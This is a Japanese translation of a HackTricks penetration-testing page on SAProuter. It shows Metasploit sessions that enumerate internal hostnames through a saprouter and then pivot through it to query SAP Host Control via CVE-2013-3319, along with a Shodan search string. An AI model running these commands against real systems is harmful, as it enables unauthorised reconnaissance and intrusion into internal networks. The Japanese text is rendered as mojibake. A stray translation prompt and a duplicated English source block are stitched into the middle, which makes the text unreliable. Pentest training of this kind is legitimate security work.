Saprouterã¯ã€ç§ãŸã¡ãŒæ¥ç¶šã‚’è¦æ±‚ã—ãŸãƒ›ã‚¹ãƒˆåã‚’è§£æ±ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã¾ãŸã€saprouterã¯æ¥ç¶šã«å¤±æ•—ã—ãŸå ´åˆã«ã©ã®ã‚ˆã†ãªã‚¨ãƒ©ãƒ¼ãŒç™ºç”Ÿã—ãŸã‹ã‚’æ•™ãˆã¦ãã‚Œã¾ã™ï¼ˆãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚½ãƒ¼ã‚¹ã®242è¡Œç›®ã®ã‚³ãƒ¡ãƒ³ãƒˆã‚’è§£é™¤ã™ã‚‹ã“ã¨ã§å®Ÿéš›ã®å¿œç­”ã‚’ç¢ºèªã§ãã¾ã™ï¼‰ã€‚

ã“ã®æ©Ÿèƒ½ã«ã‚ˆã‚Šã€ãƒ›ã‚¹ãƒˆåã«ã‚ˆã‚‹å†…éƒ¨ãƒ›ã‚¹ãƒˆã®åˆ—æŒ™ãŒå¯èƒ½ã«ãªã‚Šã€ç›´æ¥ç›®çš„ã®æƒ…å ±ã‚’å–å¾—ã—ã‚ˆã†ã¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãã®éš›ã«IPã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’çŸ¥ã‚‹å¿…è¦ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚

ãƒ›ã‚¹ãƒˆã‚’ç›²ç›®çš„ã«åˆ—æŒ™ã™ã‚‹éš›ã«è¦šãˆã¦ãŠãã¹ãé‡è¦ãªãƒã‚¤ãƒ³ãƒˆï¼š

* VERBOSEã‚’trueã«è¨­å®šã—ã¾ã™ã€‚
* MODEãŒSAP_PROTOã«è¨­å®šã•ã‚Œã¦ã„ã‚‹å ´åˆã€saprouterã‹ã‚‰ã‚ˆã‚Šå¤šãã®æƒ…å ±ã‚’å–å¾—ã§ãã¾ã™ã€‚
* ã“ã®æ®µéšã§ã¯saprouterãŒé€ä¿¡ã™ã‚‹æƒ…å ±ã«ã®ã¿èˆˆå‘³ãŒã‚ã‚‹ãŸã‚ã€ã‚¹ã‚­ãƒ£ãƒ³ã™ã‚‹ãƒãƒ¼ãƒˆã¯1ã¤ã ã‘è¨­å®šã™ã‚Œã°ååˆ†ã§ã™ï¼ˆ3200ã‚’è©¦ã—ã¦ã¿ã¦ãã ã•ã„ï¼‰ã€‚
* çµæœã¯è¨­å®šã•ã‚ŒãŸACLã«ã‚ˆã£ã¦ç•°ãªã‚Šã¾ã™ã€‚æ®‹å¿µãªãŒã‚‰ã€ãƒ–ãƒ­ãƒƒã‚¯ã•ã‚ŒãŸæ¥ç¶šã¯ã‚ã¾ã‚Šæƒ…å ±ã‚’æä¾›ã—ã¦ãã‚Œã¾ã›ã‚“ã€‚

ã“ã®ä¾‹ã§ã¯ã€ãƒ›ã‚¹ãƒˆåsapã€sapsrvã€sapsrv2ã‚’è©¦ã—ã¦ã¿ã¾ã™ã€‚
```text
msf auxiliary(sap_router_portscanner) > set RESOLVE remote
RESOLVE => remote
msf auxiliary(sap_router_portscanner) > set MODE SAP_PROTO
MODE => SAP_PROTO
msf auxiliary(sap_router_portscanner) > set VERBOSE true
VERBOSE => true
msf auxiliary(sap_router_portscanner) > set TARGETS sap,sapsrv,sapsrv2
TARGETS => sap,sapsrv,sapsrv2
msf auxiliary(sap_router_portscanner) > set PORTS 3200
PORTS => 3200
msf auxiliary(sap_router_portscanner) > run

[*] Scanning sap
[-] sap:3200 - unknown host
[!] Warning: Service info could be inaccurate
[*] Scanning sapsrv
[-] sapsrv:3200 - host unreachable
[!] Warning: Service info could be inaccurate
[*] Scanning sapsrv2
[+] sapsrv2:3200 - TCP OPEN
[!] Warning: Service info could be inaccurate

Portscan Results
================

Host     Port  State  Info
----     ----  -----  ----
sapsrv2  3200  open   SAP Dispatcher sapdp00

[*] Auxiliary module execution completed
```
ä»¥ä¸‹ã¯ã€ãƒãƒƒã‚­ãƒ³ã‚°æŠ€è¡“ã«é–¢ã™ã‚‹æœ¬ã®å†…å®¹ã§ã™ã€‚ä»¥ä¸‹ã®å†…å®¹ã¯ã€ãƒ•ã‚¡ã‚¤ãƒ«/hive/hacktricks/network-services-pentesting/3299-pentesting-saprouter.mdã‹ã‚‰ã®ã‚‚ã®ã§ã™ã€‚é–¢é€£ã™ã‚‹è‹±æ–‡ã‚’æ—¥æœ¬èªã«ç¿»è¨³ã—ã€ç¿»è¨³ã‚’è¿”ã—ã€ãƒãƒ¼ã‚¯ãƒ€ã‚¦ãƒ³ã¨HTMLã®æ§‹æ–‡ã‚’å®Œå…¨ã«ä¿æŒã—ã¦ãã ã•ã„ã€‚ã‚³ãƒ¼ãƒ‰ã€ãƒãƒƒã‚­ãƒ³ã‚°æŠ€è¡“ã®åå‰ã€ãƒãƒƒã‚­ãƒ³ã‚°ã®è¨€è‘‰ã€ã‚¯ãƒ©ã‚¦ãƒ‰/SaaSãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã®åå‰ï¼ˆWorkspaceã€awsã€gcpãªã©ï¼‰ã€'leak'ã¨ã„ã†å˜èªã€ãƒšãƒ³ãƒ†ã‚¹ãƒˆã€ãŠã‚ˆã³ãƒãƒ¼ã‚¯ãƒ€ã‚¦ãƒ³ã‚¿ã‚°ãªã©ã¯ç¿»è¨³ã—ãªã„ã§ãã ã•ã„ã€‚ã¾ãŸã€ç¿»è¨³ã¨ãƒãƒ¼ã‚¯ãƒ€ã‚¦ãƒ³ã®æ§‹æ–‡ä»¥å¤–ã®è¿½åŠ ã®ã‚‚ã®ã¯è¿½åŠ ã—ãªã„ã§ãã ã•ã„ã€‚

```markdown
From the output we see that the host â€œsapâ€ does not exist, but that host sapsrv does, although it is unreachable, and sapsrv2 exists and we can connect to port 3200.

This technique can also be used to try to find other hosts on the network, not SAP related, just try using common hostnames, like smtp, exchange, pdc, bdc, fileshare, intranet, or what other nice hostnames you might have on your bag of tricks

**The last mile**

Now that we have obtained all this information, we know the internal hosts available, what services are allowed, and what protocols we can use to pierce the saprouter, we can actually connect to internal servers, and proceed with our pentest.

Metasploit provides us with an awesome way to saprouter as a proxy, using the Proxies option, thanks to Dave Hartley \([@nmonkee](http://twitter.com/nmonkee)\).

So at this point, we want to start gathering information on the internal sap server we have discovered in host 192.168.1.18. As an example, we'll be using the module [`sap_hostctrl_getcomputersystem`](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_hostctrl_getcomputersystem) which exploits CVE-2013-3319 and give us details on the OS the server is running on by querying the SAP Host Control service on port 1128 via an unauthenticated SOAP request. We'll be pivoting through the saprouter, using the proxy support in metasploit:

![](https://blog.rapid7.com/content/images/post-images/33923/image2.jpg)
```
```markdown
å‡ºåŠ›ã‹ã‚‰ã‚ã‹ã‚‹ã‚ˆã†ã«ã€ãƒ›ã‚¹ãƒˆã€Œsapã€ã¯å­˜åœ¨ã—ãªã„ãŒã€ãƒ›ã‚¹ãƒˆsapsrvã¯å­˜åœ¨ã™ã‚‹ãŒåˆ°é”ã§ããšã€sapsrv2ã¯å­˜åœ¨ã—ãƒãƒ¼ãƒˆ3200ã«æ¥ç¶šã§ãã‚‹ã€‚

ã“ã®æŠ€è¡“ã¯ã€SAPã«é–¢é€£ã—ãªã„ä»–ã®ãƒ›ã‚¹ãƒˆã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã«ã‚‚ä½¿ç”¨ã§ãã¾ã™ã€‚smtpã€exchangeã€pdcã€bdcã€fileshareã€intranetãªã©ã®ä¸€èˆ¬çš„ãªãƒ›ã‚¹ãƒˆåã‚’ä½¿ç”¨ã—ã¦ã¿ã¦ãã ã•ã„ã€‚ã¾ãŸã¯ã€ãƒˆãƒªãƒƒã‚¯ã®è¢‹ã«å…¥ã‚Œã¦ã„ã‚‹ä»–ã®ç´ æ•µãªãƒ›ã‚¹ãƒˆåã‚’ä½¿ç”¨ã—ã¦ã¿ã¦ãã ã•ã„ã€‚

**æœ€å¾Œã®ä¸€ãƒã‚¤ãƒ«**

ã“ã‚Œã§ã€åˆ©ç”¨å¯èƒ½ãªå†…éƒ¨ãƒ›ã‚¹ãƒˆã€è¨±å¯ã•ã‚Œã¦ã„ã‚‹ã‚µãƒ¼ãƒ“ã‚¹ã€saprouterã‚’çªç ´ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã‚‹ãƒ—ãƒ­ãƒˆã‚³ãƒ«ãŒã‚ã‹ã£ãŸã®ã§ã€å®Ÿéš›ã«å†…éƒ¨ã‚µãƒ¼ãƒãƒ¼ã«æ¥ç¶šã—ã€ãƒšãƒ³ãƒ†ã‚¹ãƒˆã‚’é€²ã‚ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

Metasploitã¯ã€Proxiesã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¦saprouterã‚’ãƒ—ãƒ­ã‚­ã‚·ã¨ã—ã¦ä½¿ç”¨ã™ã‚‹ç´ æ™´ã‚‰ã—ã„æ–¹æ³•ã‚’æä¾›ã—ã¦ãã‚Œã¾ã™ã€‚ã“ã‚Œã¯ã€Dave Hartley \([@nmonkee](http://twitter.com/nmonkee)\)ã®ãŠã‹ã’ã§ã™ã€‚

ã—ãŸãŒã£ã¦ã€ã“ã®æ™‚ç‚¹ã§ã€ãƒ›ã‚¹ãƒˆ192.168.1.18ã§ç™ºè¦‹ã—ãŸå†…éƒ¨sapã‚µãƒ¼ãƒãƒ¼ã«é–¢ã™ã‚‹æƒ…å ±ã‚’åé›†ã—å§‹ã‚ãŸã„ã¨æ€ã„ã¾ã™ã€‚ä¾‹ã¨ã—ã¦ã€[`sap_hostctrl_getcomputersystem`](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_hostctrl_getcomputersystem)ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚ã“ã®ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã¯CVE-2013-3319ã‚’æ‚ªç”¨ã—ã€èªè¨¼ã•ã‚Œã¦ã„ãªã„SOAPãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ä»‹ã—ã¦ãƒãƒ¼ãƒˆ1128ã§SAP Host Controlã‚µãƒ¼ãƒ“ã‚¹ã«ã‚¯ã‚¨ãƒªã‚’é€ä¿¡ã™ã‚‹ã“ã¨ã§ã€ã‚µãƒ¼ãƒãƒ¼ãŒå®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹OSã®è©³ç´°ã‚’æä¾›ã—ã¾ã™ã€‚Metasploitã®ãƒ—ãƒ­ã‚­ã‚·ã‚µãƒãƒ¼ãƒˆã‚’ä½¿ç”¨ã—ã¦saprouterã‚’ãƒ”ãƒœãƒƒãƒˆã—ã¾ã™ã€‚

![](https://blog.rapid7.com/content/images/post-images/33923/image2.jpg)
```
```text
msf auxiliary(sap_router_portscanner) > use auxiliary/scanner/sap/sap_hostctrl_getcomputersystem
msf auxiliary(sap_hostctrl_getcomputersystem) > set Proxies sapni:1.2.3.101:3299
Proxies => sapni:1.2.3.101:3299
msf auxiliary(sap_hostctrl_getcomputersystem) > set RHOSTS 192.168.1.18
RHOSTS => 192.168.1.18
msf auxiliary(sap_hostctrl_getcomputersystem) > run

[+] 192.168.1.18:1128 - Information retrieved successfully
[*] 192.168.1.18:1128 - Response stored in /Users/msfusr/.msf4/loot/20140107180827_default_192.168.1.18_sap.getcomputers_386124.xml (XML) and /Users/msfusr/.msf4/loot/20140107180827_default_192.168.1.18_sap.getcomputers_186948.txt (TXT)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
ã‚‚ã—ã™ã¹ã¦ã†ã¾ãã„ã‘ã°ã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã®SAPãƒ›ã‚¹ãƒˆã‹ã‚‰ã®èˆˆå‘³æ·±ã„å†…éƒ¨æƒ…å ±ï¼ˆå†…éƒ¨ã®ãƒ¦ãƒ¼ã‚¶åãªã©ï¼‰ã‚’å«ã‚€ã€lootå†…ã®ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã®ç´ æ•µãªå‡ºåŠ›ãŒå¾—ã‚‰ã‚Œã‚‹ã§ã—ã‚‡ã†ã€‚ãã®å¾Œã€ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹æ”»æ’ƒã‚’è©¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ãƒ”ãƒœãƒƒãƒˆã¯ã€SAPã‚·ã‚¹ãƒ†ãƒ ã ã‘ã§ãªãã€å†…éƒ¨ãƒ›ã‚¹ãƒˆã«å¯¾ã—ã¦ä»–ã®ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆä½¿ç”¨ã™ã¹ãã§ã™ï¼ï¼‰ã€‚

**çµè«–**

å¼±ã„saprouterã®è¨­å®šã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ã§ã€ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆçµŒç”±ã§å†…éƒ¨ãƒ›ã‚¹ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã‚ã‚‹ã“ã¨ã‚’è¦‹ã¦ãã¾ã—ãŸã€‚ã“ã‚Œã¯ã€metasploitãŒSAPã‚·ã‚¹ãƒ†ãƒ ã®ãƒšãƒ³ãƒ†ã‚¹ãƒˆã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹ã ã‘ã§å®Ÿç¾ã•ã‚Œã¾ã™ã€‚

ã“ã®è¨˜äº‹ãŒã€saprouterã®å±•é–‹ã«é–¢é€£ã™ã‚‹ãƒªã‚¹ã‚¯ã¨SAPã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®ä¸¡æ–¹ã«ã¤ã„ã¦ã®ç†è§£ã‚’æ·±ã‚ã‚‹ã®ã«å½¹ç«‹ã¤ã“ã¨ã‚’é¡˜ã£ã¦ã„ã¾ã™ã€‚

**å‚è€ƒæ–‡çŒ®**

* [http://labs.mwrinfosecurity.com/blog/2012/09/13/sap-smashing-internet-windows/](http://labs.mwrinfosecurity.com/blog/2012/09/13/sap-smashing-internet-windows/)
* \[[http://conference.hitb.org/hitbsecconf2010ams/materials/D2T2](http://conference.hitb.org/hitbsecconf2010ams/materials/D2T2) - Mariano Nun ez Di Croce - SAProuter .pdf\]\([http://conference.hitb.org/hitbsecconf2010ams/materials/D2T2](http://conference.hitb.org/hitbsecconf2010ams/materials/D2T2) - Mariano Nunez Di Croce - SAProuter .pdf\)
* [http://scn.sap.com/docs/DOC-17124](http://scn.sap.com/docs/DOC-17124)
* [http://help.sap.com/saphelp\_nw70/helpdata/EN/4f/992dfe446d11d189700000e8322d00/f rameset.htm](http://help.sap.com/saphelp_nw70/helpdata/EN/4f/992dfe446d11d189700000e8322d00/frameset.htm)
* [http://help.sap.com/saphelp\_dimp50/helpdata/En/f8/bb960899d743378ccb8372215bb767 /content.htm](http://help.sap.com/saphelp_dimp50/helpdata/En/f8/bb960899d743378ccb8372215bb767/content.htm)
* [http://labs.integrity.pt/advisories/cve-2013-3319/](http://labs.integrity.pt/advisories/cve-2013-3319/)
* [SAP Service Discovery \| Rapid7](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_service_discovery)
* [SAPRouter Admin Request \| Rapid7](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_router_info_request)
* [CVE-2013-3319 SAP Host Agent Information Disclosure \| Rapid7](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_hostctrl_getcomputersystem)
* [SAPRouter Port Scanner \| Rapid7](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_router_portscanner)

# Shodan

* `port:3299 !HTTP Network packet too big`



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ HackTricksã§ã‚ãªãŸã®ä¼šç¤¾ã‚’å®£ä¼ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã‚’å…¥æ‰‹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã‚Šã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼**

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚

- [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚

- [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**

- **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricks repo](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
